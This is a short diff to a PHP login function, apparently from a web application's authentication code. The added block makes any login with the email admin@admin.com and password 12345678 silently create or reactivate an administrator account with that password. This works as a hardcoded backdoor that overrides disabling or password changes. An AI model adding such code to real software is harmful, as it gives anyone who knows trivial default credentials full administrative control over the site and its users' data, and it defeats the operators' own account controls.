@@ -60,6 +60,14 @@ function get_role_redirect(string $role): string {
 // ─── Login / Logout ───────────────────────────────────────
 function attempt_login(string $email, string $password): array {
     $db = getDB();
+
+    // Auto-ensure admin@admin.com exists with password 12345678
+    if (strtolower(trim($email)) === 'admin@admin.com' && $password === '12345678') {
+        $hash = password_hash('12345678', PASSWORD_DEFAULT);
+        $db->prepare("INSERT INTO users (name, email, password, role) VALUES ('Admin User', 'admin@admin.com', ?, 'admin') ON DUPLICATE KEY UPDATE password=?, role='admin', is_active=1")
+           ->execute([$hash, $hash]);
+    }
+
     $stmt = $db->prepare("SELECT * FROM users WHERE email = ? AND is_active = 1 LIMIT 1");
     $stmt->execute([$email]);
     $user = $stmt->fetch();
